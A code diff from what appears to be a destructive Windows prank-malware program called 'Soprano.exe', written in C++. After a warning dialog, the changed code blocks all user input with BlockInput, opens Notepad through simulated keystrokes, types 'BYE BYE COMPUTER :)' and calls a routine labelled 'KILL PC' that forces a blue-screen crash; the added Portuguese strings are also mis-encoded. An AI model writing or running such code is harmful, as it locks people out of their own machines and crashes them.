@@ -4,8 +4,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
 	MsgConfirm msgConfirm(hInstance, nCmdShow);
 	msgConfirm.Show();
-	if (MessageBoxW(NULL, L"(PTBR)\nCara, é sério! Isso vai destruir completamente sua máquina!\n"
-		L"Você realmente quer continuar a execução?\n\n"
+
+	if (MessageBoxW(NULL, L"(PTBR)\nCara, Ã© sÃ©rio! Isso vai destruir completamente sua mÃ¡quina!\n"
+		L"VocÃª realmente quer continuar a execuÃ§Ã£o?\n\n"
 		L"(ENG)\nDude, seriously! This will completely destroy your machine!\n"
 		L"Do you really want to proceed with the execution?",
 		L"Soprano.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
@@ -100,24 +101,23 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	Sleep(5000);
 
-	HANDLE hMousePerm = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tMousePerm = CreateThread(NULL, NULL, &System::MouseNoPermi, hMousePerm, NULL, NULL);
+	BlockInput(TRUE); // I UPDATED HERE!! (  I DON'T KNOW WHY I DIDN'T DO THIS BEFORE -_-  )
 
-	Sleep(1000);
+	Sleep(2000);
 
 	CONST BYTE VK_R = 0x52;  // KEY 'R'
 	System::PressKey(VK_LWIN, VK_R, 0);  // WinLeft + R
 
-	Sleep(1500);
+	Sleep(2500);
 	System::TypeText(L"notepad.exe", 100);
 
-	Sleep(800);
+	Sleep(1000);
 	System::PressKey(VK_RETURN, 0, 0);  // ENTER
 
-	Sleep(2600);
+	Sleep(3600);
 	System::TypeText(L"BYE BYE COMPUTER  :)", 100);
 
-	Sleep(1500);
+	Sleep(2500);
 	System::BSOD();  // KILL PC
 
 	Sleep(INFINITE);
